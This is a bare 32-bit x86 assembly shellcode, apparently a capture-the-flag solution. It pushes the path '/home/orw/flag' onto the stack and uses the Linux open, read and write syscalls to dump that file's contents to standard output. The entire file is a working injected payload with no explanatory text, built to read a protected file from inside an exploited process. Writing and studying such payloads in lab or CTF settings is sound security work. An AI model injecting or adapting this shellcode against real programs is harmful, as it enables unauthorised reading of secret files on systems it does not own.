BITS 32

start:
        push "ag"
        push "w/fl" 
        push "e/or"
        push "/hom" 
        push esp

        xor eax, eax    ;clean up the registers
        xor ebx, ebx
        xor edx, edx
        xor ecx, ecx

        mov al, 5       ;syscall open 
        pop ebx 
        mov cl, 0
        mov dl, 0
        int 0x80

        sub esp, 100

        mov al, 3       ;syscall read 
        mov ebx, eax 
        mov ecx, esp 
        mov dl, 100 
        int 0x80

        mov al, 4       ;syscall write 
        mov bl, 1 
        mov ecx, esp 
        mov dl, 100 
        int 0x80

        add esp, 100

        ;xor eax, eax
        ;mov al, 1       ;exit the shellcode
        ;xor ebx,ebx
        ;int 0x80

